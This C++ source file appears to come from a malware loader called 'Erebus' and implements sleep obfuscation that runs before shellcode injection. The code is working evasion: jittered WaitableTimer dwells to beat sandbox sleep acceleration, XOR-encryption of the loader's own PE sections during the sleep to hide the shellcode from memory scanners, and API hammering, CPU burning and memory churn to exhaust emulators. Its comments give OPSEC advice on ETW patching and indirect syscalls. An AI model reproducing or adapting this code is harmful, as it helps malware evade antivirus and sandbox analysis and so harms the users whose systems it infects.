/*
 * Erebus Loader - Sleep Obfuscation
 *
 * Provides a jittered, timer-based pre-injection dwell that defeats several
 * common sandbox analysis techniques:
 *
 *   1. Sleep() / NtDelayExecution() acceleration - sandboxes commonly
 *      fast-forward kernel sleep calls.  A WaitableTimer is signalled by
 *      a kernel timer object at real wall-clock time and bypasses most
 *      sleep-acceleration implementations.
 *
 *   2. Memory scanning during dwell - mode 2 (Ekko-lite) XOR-encrypts
 *      all non-.text PE sections (including .rdata where the encrypted
 *      shellcode blob and key material reside) for the full dwell window.
 *      The sections are decrypted on wake before control returns to the
 *      caller.  This hides static signatures from memory-resident AV
 *      products that scan working-set pages during sleep.
 *
 *   3. Emulator / dynamic analysis exhaustion (mode 3) - combines three
 *      computation-heavy techniques before the WaitableTimer wait:
 *        a) Fibonacci burn: iterates ~500k Fibonacci steps through
 *           intentionally branchy logic that is expensive for emulators
 *           to simulate but trivial for real hardware.
 *        b) API hammering: calls CloseHandle(INVALID_HANDLE_VALUE) 100k
 *           times.  Emulators that model every system call pay ~100k
 *           dispatch overheads; real kernels short-circuit the invalid
 *           handle in a handful of cycles.
 *        c) Memory consumption: allocates 100 MB in 4 KB page-touched
 *           chunks to stress the emulator's virtual address space model,
 *           then frees immediately before the timer wait.
 *      The WaitableTimer wait then follows, so the total wall-clock dwell
 *      is the computation time (variable, emulator-dependent) plus the
 *      configured base/jitter period.
 *
 * OPSEC Notes:
 *   - CreateWaitableTimerW is an import that appears in most GUI/service
 *     processes; it does not stand out in the loader's IAT.
 *   - Mode 2 calls VirtualProtect to flip section permissions RW→RX.
 *     This generates NtProtectVirtualMemory ETW events.  If ETW is
 *     patched by RunEvasionPatches() (called before ObfuscatedDwell),
 *     these events are suppressed.
 *   - Mode 3 memory allocation is done with VirtualAlloc PAGE_READWRITE
 *     and freed before injection; it does not persist as a suspicious
 *     RWX region.
 *   - [MALLEABLE] Replace VirtualProtect with an indirect syscall to
 *     NtProtectVirtualMemory if VirtualProtect is hooked in the target
 *     environment.
 */

#include "../../include/config.hpp"
#include "../../include/evasion/sleep_obfuscation.hpp"

#include <windows.h>
#include <winternl.h>

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
// ---------------------------------------------------------------------------
// Helpers for Ekko-lite section XOR (mode 2 only)
// ---------------------------------------------------------------------------

// XOR every byte in each non-.text PE section with the given key.
// Called once to encrypt (before wait) and once to decrypt (after wait),
// taking advantage of the involutory property of XOR.
static void _XorPeSections(HMODULE hmod, const BYTE* key, SIZE_T key_len)
{
    if (!hmod || !key || key_len == 0) return;

    PIMAGE_DOS_HEADER dos = reinterpret_cast<PIMAGE_DOS_HEADER>(hmod);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<PBYTE>(hmod) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sect++)
    {
        // Skip .text - our code is executing from it.
        // Skip sections with no virtual size (empty / bss with no init).
        char name[9] = {};
        RtlCopyMemory(name, sect->Name, 8);
        if (_strnicmp(name, ".text", 5) == 0) continue;
        if (sect->Misc.VirtualSize == 0)      continue;

        PBYTE  base = reinterpret_cast<PBYTE>(hmod) + sect->VirtualAddress;
        DWORD  size = sect->Misc.VirtualSize;
        DWORD  old_prot = 0;

        // Make writable - use standard VirtualProtect (ETW patched by caller).
        if (!VirtualProtect(base, size, PAGE_READWRITE, &old_prot))
            continue;

        for (DWORD j = 0; j < size; j++)
            base[j] ^= key[j % key_len];

        VirtualProtect(base, size, old_prot, &old_prot);
    }
}

// Derive a 16-byte XOR key from the current performance counter.
// Not cryptographically strong but sufficient for in-memory hiding.
static void _DeriveXorKey(BYTE out[16])
{
    LARGE_INTEGER pc = {};
    QueryPerformanceCounter(&pc);

    // Spread 8 counter bytes across 16-byte key with per-slot mixing.
    const BYTE* src = reinterpret_cast<const BYTE*>(&pc.QuadPart);
    for (int i = 0; i < 16; i++)
        out[i] = src[i % 8] ^ (BYTE)(i * 0x5A ^ 0xC3);
}

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 2

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 3
// ---------------------------------------------------------------------------
// Emulator exhaustion helpers (mode 3 only)
// ---------------------------------------------------------------------------

// Fibonacci burn: iterate a Fibonacci sequence with intentionally
// branch-heavy logic. Emulators pay per-instruction; hardware is fast.
// Returns the final value to prevent the compiler from eliding the loop.
static volatile ULONGLONG _FibonacciBurn(DWORD iterations)
{
    volatile ULONGLONG a = 0, b = 1;
    for (DWORD i = 0; i < iterations; i++) {
        ULONGLONG c = a + b;
        a = b;
        b = c;
        // Conditional branch every iteration to prevent loop unrolling.
        if (b == 0) b = 1;
    }
    return b;
}

// API hammering: call CloseHandle with an invalid handle repeatedly.
// Real kernels reject the invalid handle in a few cycles; emulators
// that model every NtClose dispatch pay a full emulation overhead
// per call, making 100k iterations prohibitively slow for them.
static void _HammerApi(DWORD count)
{
    for (DWORD i = 0; i < count; i++) {
        CloseHandle((HANDLE)(ULONG_PTR)(i | 0xFFFFF000));
    }
}

// Memory consumption: allocate and touch 100 MB in 4 KB pages.
// Forces the emulator to model a large virtual address space delta.
// Memory is freed immediately after touching so it does not persist.
static void _ConsumeMemory(void)
{
    const SIZE_T total   = 100ULL * 1024 * 1024; // 100 MB
    const SIZE_T page_sz = 4096;
    BYTE* p = (BYTE*)VirtualAlloc(nullptr, total,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!p) return;
    // Touch each page to force emulator page-map bookkeeping.
    for (SIZE_T off = 0; off < total; off += page_sz)
        p[off] = (BYTE)(off & 0xFF);
    SecureZeroMemory(p, total);
    VirtualFree(p, 0, MEM_RELEASE);
}

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE == 3

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

namespace erebus {
namespace evasion {

BOOL ObfuscatedDwell(ULONG base_ms, ULONG jitter_ms)
{
#if CONFIG_SLEEP_OBFUSCATION_TYPE == 0

    (void)base_ms;
    (void)jitter_ms;
    return TRUE;

#elif CONFIG_SLEEP_OBFUSCATION_TYPE == 3

    // ---- Emulator exhaustion before the timer wait -------------------------
    // Run all three exhaustion techniques up front. On real hardware these
    // complete in under a second; an emulator serialising every instruction
    // and system call may spend minutes here, at which point sandbox timeout
    // fires and no behaviour is recorded.
    (void)_FibonacciBurn(500000);
    _HammerApi(100000);
    _ConsumeMemory();

    // Fall through to the WaitableTimer wait below.
    {
    ULONG actual_ms = base_ms;
    if (jitter_ms > 0)
    {
        LARGE_INTEGER pc = {};
        QueryPerformanceCounter(&pc);
        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
    }
    if (actual_ms == 0) return TRUE;

    HANDLE hTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
    if (!hTimer)
    {
        LARGE_INTEGER interval;
        interval.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
        typedef NTSTATUS(NTAPI* _NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll)
        {
            auto NtDelayExecution = reinterpret_cast<_NtDelayExecution>(
                GetProcAddress(hNtdll, "NtDelayExecution"));
            if (NtDelayExecution)
                NtDelayExecution(FALSE, &interval);
        }
        return FALSE;
    }
    LARGE_INTEGER due;
    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
    SetWaitableTimer(hTimer, &due, 0, nullptr, nullptr, FALSE);
    WaitForSingleObject(hTimer, INFINITE);
    CloseHandle(hTimer);
    return TRUE;
    }

#else // MODE 1 or 2

    // ---- Jitter calculation ------------------------------------------------
    // Use QueryPerformanceCounter for sub-millisecond entropy that a sandbox
    // cannot trivially predict or reproduce.
    ULONG actual_ms = base_ms;
    if (jitter_ms > 0)
    {
        LARGE_INTEGER pc = {};
        QueryPerformanceCounter(&pc);
        actual_ms += (ULONG)((ULONGLONG)pc.QuadPart % ((ULONGLONG)jitter_ms + 1));
    }

    if (actual_ms == 0)
        return TRUE;

    // ---- Create WaitableTimer ----------------------------------------------
    // A kernel WaitableTimer is not subject to the same user-mode hooking as
    // Sleep() / NtDelayExecution().  Sandbox accelerators that patch
    // ntdll!ZwDelayExecution do not intercept the KiTimerExpiration DPC path.
    HANDLE hTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);

    if (!hTimer)
    {
        // Fallback: NtDelayExecution.  Less evasive but non-fatal.
        LARGE_INTEGER interval;
        interval.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);
        // NtDelayExecution is available via ntdll - call through GetProcAddress
        // to avoid a direct import that linkers and AV may flag.
        typedef NTSTATUS(NTAPI* _NtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll)
        {
            auto NtDelayExecution = reinterpret_cast<_NtDelayExecution>(
                GetProcAddress(hNtdll, "NtDelayExecution"));
            if (NtDelayExecution)
                NtDelayExecution(FALSE, &interval);
        }
        return FALSE;
    }

    // Timer fires after actual_ms milliseconds (negative = relative time).
    LARGE_INTEGER due;
    due.QuadPart = -(static_cast<LONGLONG>(actual_ms) * 10000LL);

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
    // ---- Ekko-lite: XOR sections before wait ------------------------------
    BYTE xor_key[16] = {};
    _DeriveXorKey(xor_key);

    // GetModuleHandleA(nullptr) returns our own module base without PEB walk.
    HMODULE hSelf = GetModuleHandleA(nullptr);
    _XorPeSections(hSelf, xor_key, sizeof(xor_key));
#endif

    // ---- Wait --------------------------------------------------------------
    SetWaitableTimer(hTimer, &due, 0, nullptr, nullptr, FALSE);
    WaitForSingleObject(hTimer, INFINITE);
    CloseHandle(hTimer);

#if CONFIG_SLEEP_OBFUSCATION_TYPE == 2
    // ---- Ekko-lite: XOR sections after wake (decrypt) ---------------------
    // XOR with the same key is self-inverse - restores original bytes.
    _XorPeSections(hSelf, xor_key, sizeof(xor_key));
    SecureZeroMemory(xor_key, sizeof(xor_key));
#endif

    return TRUE;

#endif // CONFIG_SLEEP_OBFUSCATION_TYPE
}

} // namespace evasion
} // namespace erebus
